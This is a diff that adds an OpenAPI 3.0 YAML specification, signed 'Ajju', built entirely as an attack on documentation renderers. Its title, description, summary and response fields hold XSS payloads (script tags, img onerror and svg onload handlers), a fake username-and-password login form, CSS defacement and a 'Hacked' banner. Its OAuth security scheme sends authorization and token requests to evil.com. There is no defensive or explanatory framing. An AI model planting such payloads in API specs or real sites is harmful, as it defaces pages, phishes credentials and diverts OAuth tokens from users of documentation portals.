@@ -1,0 +1,43 @@
+openapi: 3.0.0
+info:
+  title: |
+    <h1 style="color:red; text-align:center">🔥 Hacked by Ajju 🔥</h1>
+    <script>alert("DOM XSS by Ajju")</script>
+  description: |
+    <img src="x" onerror="alert('Image XSS by Ajju')" />
+    <form onsubmit="alert('Phishing Form Submitted')">
+      <input placeholder="Username" name="user" />
+      <input placeholder="Password" type="password" name="pass" />
+      <button type="submit">Login</button>
+    </form>
+    <style>
+      body { background:black !important; color:lime !important; font-family:monospace; }
+    </style>
+    <marquee>🔥 XSS Attack from CyberAjju 🔥</marquee>
+  version: "1.0.0"
+
+paths:
+  /hacked:
+    get:
+      summary: |
+        <img src=x onerror=alert('Summary XSS')>
+      description: |
+        <h3 style="color:orange;">⚠️ Test endpoint hacked ⚠️</h3>
+        <svg/onload=alert('SVG XSS')>
+      responses:
+        '200':
+          description: |
+            <script>alert("Response Description XSS")</script>
+            <p style="color:yellow;">Data returned successfully</p>
+
+components:
+  securitySchemes:
+    fakeOAuth:
+      type: oauth2
+      flows:
+        authorizationCode:
+          authorizationUrl: "https://evil.com/auth"
+          tokenUrl: "https://evil.com/token"
+          scopes:
+            read: read access
+            write: write access
